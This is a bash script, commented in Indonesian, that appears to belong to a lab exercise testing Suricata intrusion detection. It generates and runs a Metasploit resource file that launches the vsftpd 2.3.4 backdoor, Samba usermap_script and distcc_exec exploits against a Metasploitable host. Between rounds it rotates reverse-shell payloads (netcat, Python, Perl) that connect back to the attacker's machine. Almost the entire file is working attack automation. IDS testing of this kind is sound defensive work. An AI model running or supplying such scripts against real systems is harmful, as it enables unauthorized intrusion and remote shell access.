#!/bin/bash

# =================================================================
# MODUL 07: REMOTE CODE EXECUTION (METASPLOIT) - ROTASI PAYLOAD
# Strategi: 3 Level Depth (Backdoor, Encoded Payload, Alt Vector)
# Input: Menerima argumen $1 sebagai Nomor Ronde
# =================================================================

# Menerima Input Nomor Ronde dari Daily Round
ROUND=${1:-1} # Default ke ronde 1 jika kosong

# KONFIGURASI
TARGET_IP="192.168.x.x"   # Ganti dengan IP Metasploitable
LHOST="192.168.x.x"      # PENTING: Ganti dengan IP Kali Linux Anda!
RC_SCRIPT="logs/auto_exploit.rc"
LOG_FILE="logs/rce_console_output.txt"

# Warna untuk Tampilan Laporan
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
RED='\033[0;31m'
NC='\033[0m' # No Color

# =================================================================
# LOGIKA ROTASI PAYLOAD (PAYLOAD DIVERSITY)
# Mengubah Tipe Reverse Shell (Bash vs Python vs Perl)
# =================================================================
if [ "$ROUND" -le 10 ]; then
    # --- SET A (Ronde 1-10) ---
    # Payload: Generic Unix Command (Biasanya Netcat/Bash pipe)
    PAYLOAD_TYPE="cmd/unix/reverse"
    DESC_PAYLOAD="Double Reverse TCP (Netcat)"

elif [ "$ROUND" -le 20 ]; then
    # --- SET B (Ronde 11-20) ---
    # Payload: Python Inline Script
    # Signature di jaringan akan berisi string python (import socket...)
    PAYLOAD_TYPE="cmd/unix/reverse_python"
    DESC_PAYLOAD="Python Inline Reverse Shell"

else
    # --- SET C (Ronde 21-30) ---
    # Payload: Perl Inline Script
    # Signature berbeda lagi (perl -e 'use Socket...')
    PAYLOAD_TYPE="cmd/unix/reverse_perl"
    DESC_PAYLOAD="Perl Inline Reverse Shell"
fi

echo "[+] [07_RCE] Memulai Modul RCE Metasploit..."
echo "[+] Target: $TARGET_IP"
echo "[+] Attacker (LHOST): $LHOST"
echo "[+] Mode: Ronde $ROUND ($DESC_PAYLOAD)"

# Cek apakah LHOST sudah diisi benar (Safety Check)
if [[ "$LHOST" == "192.168.1.YYY" ]]; then
   echo -e "${RED}[!] ERROR: Ubah variabel LHOST di dalam script dengan IP Kali Linux Anda!${NC}"
   echo "    (Metasploit butuh LHOST untuk Reverse Shell)"
   exit 1
fi

# -----------------------------------------------------------------
# MEMBUAT RESOURCE SCRIPT METASPLOIT (.rc) - DINAMIS
# Kita generate file ini menggunakan variabel $PAYLOAD_TYPE
# -----------------------------------------------------------------
cat <<EOF > $RC_SCRIPT
# --- KONFIGURASI GLOBAL ---
setg RHOSTS $TARGET_IP
setg LHOST $LHOST
setg VERBOSE true
setg WfsDelay 10

# LEVEL 1: VSFTPD (BASELINE - STATIS)
# Modul ini payload-nya hardcoded (cmd/unix/interact), jadi tidak diubah.
use exploit/unix/ftp/vsftpd_234_backdoor
run -z
sleep 5

# LEVEL 2: SAMBA (DINAMIS)
use exploit/multi/samba/usermap_script
set PAYLOAD $PAYLOAD_TYPE
run -z
sleep 5

# LEVEL 3: DISTCC (DINAMIS)
use exploit/unix/misc/distcc_exec
set PAYLOAD $PAYLOAD_TYPE
run -z

# COMMAND EXIT PENTING
# exit -y memaksa Metasploit keluar meskipun ada sesi aktif
exit -y
EOF

# -----------------------------------------------------------------
# TAMPILAN LAPORAN (VERBOSE)
# -----------------------------------------------------------------

# LEVEL 1
echo -e "${CYAN}[LAPORAN] Level 1: Vsftpd 234 Backdoor (Port 21)${NC}"
echo -e "${YELLOW}    [Exploit] : exploit/unix/ftp/vsftpd_234_backdoor${NC}"
echo -e "${YELLOW}    [Payload] : cmd/unix/interact (Default Baseline)${NC}"
echo -e "    [Info] Menguji deteksi signature backdoor klasik"

# LEVEL 2
echo -e "${CYAN}[LAPORAN] Level 2: Samba Usermap Script (Port 139/445)${NC}"
echo -e "${YELLOW}    [Exploit] : exploit/multi/samba/usermap_script${NC}"
echo -e "${YELLOW}    [Payload] : $PAYLOAD_TYPE ($DESC_PAYLOAD)${NC}"
echo -e "    [Info] Menguji deteksi Command Injection dengan payload bervariasi"

# LEVEL 3
echo -e "${CYAN}[LAPORAN] Level 3: DistCC Daemon Execution (Port 3632)${NC}"
echo -e "${YELLOW}    [Exploit] : exploit/unix/misc/distcc_exec${NC}"
echo -e "${YELLOW}    [Payload] : $PAYLOAD_TYPE ($DESC_PAYLOAD)${NC}"
echo -e "    [Info] Menguji deteksi eksploitasi pada Uncommon Port"

echo ""

# -----------------------------------------------------------------
# MENJALANKAN METASPLOIT
# -----------------------------------------------------------------
echo -e "${CYAN}[ACTION] Menjalankan Metasploit Framework...${NC}"
echo "    (Harap bersabar, proses loading MSFConsole memakan waktu 1-2 menit...)"
echo "    (Script berjalan otomatis menggunakan resource: $RC_SCRIPT)"

# Eksekusi (Output dibuang ke file log unik per ronde)
msfconsole -q -r $RC_SCRIPT > logs/rce_console_output_r${ROUND}.txt 2>&1

echo -e "${CYAN}    -> Selesai.${NC}"
echo "    -> Output lengkap Metasploit tersimpan di: logs/rce_console_output_r${ROUND}.txt"
echo "    -> Cek alert Suricata untuk: ET EXPLOIT Vsftpd / GPL NETBIOS / ET DAEMON"

echo "[+] [07_RCE] Modul Selesai pada $(date)"
echo "-----------------------------------------------------------"